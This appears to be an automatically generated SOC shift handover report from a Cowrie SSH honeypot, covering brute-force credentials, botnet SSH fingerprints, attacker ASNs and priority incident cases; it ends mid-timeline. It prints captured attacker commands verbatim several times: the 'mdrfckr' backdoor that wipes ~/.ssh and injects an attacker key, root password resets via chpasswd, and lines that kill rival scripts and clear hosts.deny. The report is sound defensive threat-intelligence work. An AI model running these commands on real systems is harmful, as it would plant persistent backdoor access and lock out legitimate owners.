# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-07 |
| **Generated At** | 2026-06-07T14:01:37Z |
| **Shift Time** | 14:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **396** |
| Confirmed Threats | **359** |
| False Positives Filtered | **37** (9.3%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **18** |
| High Severity Cases | **103** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **293** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **282** |
| Unique Credential Pairs | **177** |
| Unique Usernames | **113** |
| Unique Passwords | **153** |
| Successful Auth Pairs | **64** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 103 |
| `345gs5662d34` | 52 |
| `test` | 4 |
| `user` | 3 |
| `admin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 52 |
| `3245gs5662d34` | 50 |
| `123456` | 14 |
| `123` | 9 |
| `1q2w3e4r5t` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 52 |
| `root` | `3245gs5662d34` | 50 |
| `ftpuser` | `1q2w3e4r5t` | 2 |
| `root` | `2wsxCDE#4rfv` | 2 |
| `jennifer` | `jennifer` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `QWE123!@#qwe` | `45.158.14.124` | 2026-06-07T11:55:02 |
| `root` | `3245gs5662d34` | `45.158.14.124` | 2026-06-07T11:55:09 |
| `root` | `Welcome_1` | `14.103.114.231` | 2026-06-07T11:59:10 |
| `root` | `Pa$$w0rd.` | `59.179.31.237` | 2026-06-07T11:59:11 |
| `root` | `3245gs5662d34` | `59.179.31.237` | 2026-06-07T11:59:13 |
| `root` | `2wsxCDE#4rfv` | `190.0.63.226` | 2026-06-07T12:00:34 |
| `root` | `3245gs5662d34` | `190.0.63.226` | 2026-06-07T12:00:40 |
| `root` | `tech1234` | `14.103.114.231` | 2026-06-07T12:00:48 |
| `root` | `passroot` | `43.163.90.141` | 2026-06-07T12:03:25 |
| `root` | `3245gs5662d34` | `43.163.90.141` | 2026-06-07T12:03:28 |
| `root` | `legend1` | `45.158.14.124` | 2026-06-07T12:03:30 |
| `root` | `admin159` | `59.179.31.237` | 2026-06-07T12:06:07 |
| `root` | `qwaszx123` | `45.158.14.124` | 2026-06-07T12:07:35 |
| `root` | `@WSX4rfv` | `59.179.31.237` | 2026-06-07T12:08:19 |
| `root` | `P@SSW0RD` | `43.163.90.141` | 2026-06-07T12:09:03 |
| `root` | `Wy123456@` | `45.158.14.124` | 2026-06-07T12:09:41 |
| `root` | `Yg12345678` | `59.179.31.237` | 2026-06-07T12:10:23 |
| `root` | `qwert` | `43.163.90.141` | 2026-06-07T12:10:50 |
| `root` | `qaz123QAZ` | `45.158.14.124` | 2026-06-07T12:12:31 |
| `root` | `yj123456` | `45.158.14.124` | 2026-06-07T12:14:32 |
| `root` | `VPS` | `43.163.90.141` | 2026-06-07T12:14:43 |
| `root` | `qq123456@` | `59.179.31.237` | 2026-06-07T12:14:53 |
| `root` | `Hh@123456789` | `43.163.90.141` | 2026-06-07T12:18:31 |
| `root` | `proxmox` | `59.179.31.237` | 2026-06-07T12:23:25 |
| `root` | `Abc2025` | `45.158.14.124` | 2026-06-07T12:24:37 |
| `root` | `168168` | `59.179.31.237` | 2026-06-07T12:25:34 |
| `root` | `baidu@123` | `43.163.90.141` | 2026-06-07T12:29:42 |
| `root` | `aliali` | `43.163.90.141` | 2026-06-07T12:31:38 |
| `root` | `12345Aa` | `45.158.14.124` | 2026-06-07T12:34:58 |
| `root` | `@A123456` | `43.163.90.141` | 2026-06-07T12:42:54 |
| `root` | `123456789101112` | `43.163.90.141` | 2026-06-07T12:44:47 |
| `root` | `2wsxCDE#4rfv` | `43.163.90.141` | 2026-06-07T12:52:32 |
| `root` | `Tw123456@` | `59.179.31.237` | 2026-06-07T12:57:23 |
| `root` | `Huawei2026` | `59.179.31.237` | 2026-06-07T12:59:41 |
| `root` | `Aa118901` | `156.245.246.50` | 2026-06-07T13:05:02 |
| `root` | `3245gs5662d34` | `156.245.246.50` | 2026-06-07T13:05:05 |
| `root` | `Secure@2025` | `59.179.31.237` | 2026-06-07T13:06:10 |
| `root` | `@qwer2025` | `138.124.99.219` | 2026-06-07T13:08:09 |
| `root` | `3245gs5662d34` | `138.124.99.219` | 2026-06-07T13:08:14 |
| `root` | `install` | `103.214.112.253` | 2026-06-07T13:09:18 |
| `root` | `3245gs5662d34` | `103.214.112.253` | 2026-06-07T13:09:21 |
| `root` | `Root2024` | `138.124.99.219` | 2026-06-07T13:10:34 |
| `root` | `Aa118901` | `116.62.22.6` | 2026-06-07T13:14:27 |
| `root` | `3245gs5662d34` | `116.62.22.6` | 2026-06-07T13:14:31 |
| `root` | `kronos` | `116.62.22.6` | 2026-06-07T13:14:52 |
| `root` | `diamond` | `46.6.124.216` | 2026-06-07T13:31:11 |
| `root` | `1234QWer` | `103.167.89.222` | 2026-06-07T13:34:18 |
| `root` | `3245gs5662d34` | `103.167.89.222` | 2026-06-07T13:34:21 |
| `root` | `P@ssw0rd.123` | `20.244.18.126` | 2026-06-07T13:38:41 |
| `root` | `3245gs5662d34` | `20.244.18.126` | 2026-06-07T13:38:42 |
| `root` | `password@2025` | `190.167.237.191` | 2026-06-07T13:43:11 |
| `root` | `3245gs5662d34` | `190.167.237.191` | 2026-06-07T13:43:17 |
| `root` | `Admin$2024` | `103.167.89.222` | 2026-06-07T13:44:35 |
| `root` | `Dd112211.` | `190.167.237.191` | 2026-06-07T13:44:59 |
| `root` | `azer1234` | `103.167.89.222` | 2026-06-07T13:46:37 |
| `root` | `Qazwsx001@` | `190.167.237.191` | 2026-06-07T13:46:44 |
| `root` | `123456b` | `20.244.18.126` | 2026-06-07T13:49:12 |
| `root` | `Windows2025` | `103.167.89.222` | 2026-06-07T13:52:57 |
| `root` | `Rs123456` | `20.244.18.126` | 2026-06-07T13:53:20 |
| `root` | `666888` | `190.167.237.191` | 2026-06-07T13:55:54 |
| `root` | `Zxc123123` | `20.244.18.126` | 2026-06-07T13:57:33 |
| `root` | `123@qwe` | `190.167.237.191` | 2026-06-07T13:57:42 |
| `root` | `qwerty121` | `103.167.89.222` | 2026-06-07T13:59:03 |
| `root` | `246810` | `20.244.18.126` | 2026-06-07T13:59:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **396** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 292 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 277 | 15 |
| `03a80b21afa8...` | Modern SSH client | 13 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 277 | 15 | Mirai/variant |
| `03a80b21afa8...` | libssh | 13 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 1 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 50 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:CPHc20NwYrO4"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.114.231`, `46.6.124.216`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:oNx7wsIea9Vp"|chpasswd|bash
```
Source IPs: `14.103.114.231`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.167.89.222`, `20.244.18.126`, `59.179.31.237`, `103.214.112.253`, `43.163.90.141`, `156.245.246.50`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **26** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS15704` | XTRA TELECOM S.A. | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (99)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-910db6d6b95d

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 11:55 |
| **Last Seen** | 2026-06-07 11:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:55:01` | `cowrie.session.connect` |
| `2026-06-07 11:55:01` | `cowrie.client.version` |
| `2026-06-07 11:55:01` | `cowrie.client.kex` |
| `2026-06-07 11:55:02` | `cowrie.login.success` |
| `2026-06-07 11:55:02` | `cowrie.session.params` |
| `2026-06-07 11:55:02` | `cowrie.command.input` |
| `2026-06-07 11:55:02` | `cowrie.command.failed` |
| `2026-06-07 11:55:03` | `cowrie.log.closed` |
| `2026-06-07 11:55:04` | `cowrie.session.params` |
| `2026-06-07 11:55:04` | `cowrie.command.input` |
| `2026-06-07 11:55:04` | `cowrie.session.file_download` |
| `2026-06-07 11:55:04` | `cowrie.log.closed` |
| `2026-06-07 11:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5a6bb5b46d

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 11:55 |
| **Last Seen** | 2026-06-07 11:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:55:07` | `cowrie.session.connect` |
| `2026-06-07 11:55:07` | `cowrie.client.version` |
| `2026-06-07 11:55:07` | `cowrie.client.kex` |
| `2026-06-07 11:55:09` | `cowrie.login.success` |
| `2026-06-07 11:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb83548dd9d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]231` |
| **First Seen** | 2026-06-07 11:59 |
| **Last Seen** | 2026-06-07 12:04 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:oNx7wsIea9Vp"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:59:09` | `cowrie.session.connect` |
| `2026-06-07 11:59:09` | `cowrie.client.version` |
| `2026-06-07 11:59:10` | `cowrie.client.kex` |
| `2026-06-07 11:59:10` | `cowrie.login.success` |
| `2026-06-07 11:59:11` | `cowrie.session.params` |
| `2026-06-07 11:59:11` | `cowrie.command.input` |
| `2026-06-07 11:59:11` | `cowrie.command.failed` |
| `2026-06-07 11:59:11` | `cowrie.log.closed` |
| `2026-06-07 11:59:12` | `cowrie.session.params` |
| `2026-06-07 11:59:12` | `cowrie.command.input` |
| `2026-06-07 11:59:12` | `cowrie.session.file_download` |
| `2026-06-07 11:59:12` | `cowrie.log.closed` |
| `2026-06-07 11:59:20` | `cowrie.session.params` |
| `2026-06-07 11:59:20` | `cowrie.command.input` |
| `2026-06-07 11:59:20` | `cowrie.log.closed` |
| `2026-06-07 11:59:20` | `cowrie.session.params` |
| `2026-06-07 11:59:20` | `cowrie.command.input` |
| `2026-06-07 12:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]231` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf3079536ee1

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 11:59 |
| **Last Seen** | 2026-06-07 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:59:11` | `cowrie.session.connect` |
| `2026-06-07 11:59:11` | `cowrie.client.version` |
| `2026-06-07 11:59:11` | `cowrie.client.kex` |
| `2026-06-07 11:59:11` | `cowrie.login.success` |
| `2026-06-07 11:59:11` | `cowrie.session.params` |
| `2026-06-07 11:59:11` | `cowrie.command.input` |
| `2026-06-07 11:59:11` | `cowrie.command.failed` |
| `2026-06-07 11:59:11` | `cowrie.log.closed` |
| `2026-06-07 11:59:11` | `cowrie.session.params` |
| `2026-06-07 11:59:11` | `cowrie.command.input` |
| `2026-06-07 11:59:11` | `cowrie.session.file_download` |
| `2026-06-07 11:59:11` | `cowrie.log.closed` |
| `2026-06-07 11:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a4eb5160a60

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 11:59 |
| **Last Seen** | 2026-06-07 11:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:59:12` | `cowrie.session.connect` |
| `2026-06-07 11:59:12` | `cowrie.client.version` |
| `2026-06-07 11:59:12` | `cowrie.client.kex` |
| `2026-06-07 11:59:13` | `cowrie.login.success` |
| `2026-06-07 11:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc057166cb50

| Field | Detail |
|---|---|
| **Source IP** | `190.0.63[.]226` |
| **First Seen** | 2026-06-07 12:00 |
| **Last Seen** | 2026-06-07 12:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:00:32` | `cowrie.session.connect` |
| `2026-06-07 12:00:32` | `cowrie.client.version` |
| `2026-06-07 12:00:32` | `cowrie.client.kex` |
| `2026-06-07 12:00:34` | `cowrie.login.success` |
| `2026-06-07 12:00:34` | `cowrie.session.params` |
| `2026-06-07 12:00:34` | `cowrie.command.input` |
| `2026-06-07 12:00:34` | `cowrie.command.failed` |
| `2026-06-07 12:00:35` | `cowrie.log.closed` |
| `2026-06-07 12:00:35` | `cowrie.session.params` |
| `2026-06-07 12:00:35` | `cowrie.command.input` |
| `2026-06-07 12:00:35` | `cowrie.session.file_download` |
| `2026-06-07 12:00:35` | `cowrie.log.closed` |
| `2026-06-07 12:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.0.63[.]226` to AbuseIPDB if not already reported
- [ ] Block `190.0.63[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef85bc63fab3

| Field | Detail |
|---|---|
| **Source IP** | `190.0.63[.]226` |
| **First Seen** | 2026-06-07 12:00 |
| **Last Seen** | 2026-06-07 12:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:00:39` | `cowrie.session.connect` |
| `2026-06-07 12:00:39` | `cowrie.client.version` |
| `2026-06-07 12:00:39` | `cowrie.client.kex` |
| `2026-06-07 12:00:40` | `cowrie.login.success` |
| `2026-06-07 12:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.0.63[.]226` to AbuseIPDB if not already reported
- [ ] Block `190.0.63[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8604a41490

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]231` |
| **First Seen** | 2026-06-07 12:00 |
| **Last Seen** | 2026-06-07 12:01 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CPHc20NwYrO4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:00:45` | `cowrie.session.connect` |
| `2026-06-07 12:00:45` | `cowrie.client.version` |
| `2026-06-07 12:00:48` | `cowrie.client.kex` |
| `2026-06-07 12:00:48` | `cowrie.login.success` |
| `2026-06-07 12:00:49` | `cowrie.session.params` |
| `2026-06-07 12:00:49` | `cowrie.command.input` |
| `2026-06-07 12:00:49` | `cowrie.command.failed` |
| `2026-06-07 12:00:49` | `cowrie.log.closed` |
| `2026-06-07 12:00:49` | `cowrie.session.params` |
| `2026-06-07 12:00:49` | `cowrie.command.input` |
| `2026-06-07 12:00:50` | `cowrie.session.file_download` |
| `2026-06-07 12:00:50` | `cowrie.log.closed` |
| `2026-06-07 12:00:57` | `cowrie.session.params` |
| `2026-06-07 12:00:57` | `cowrie.command.input` |
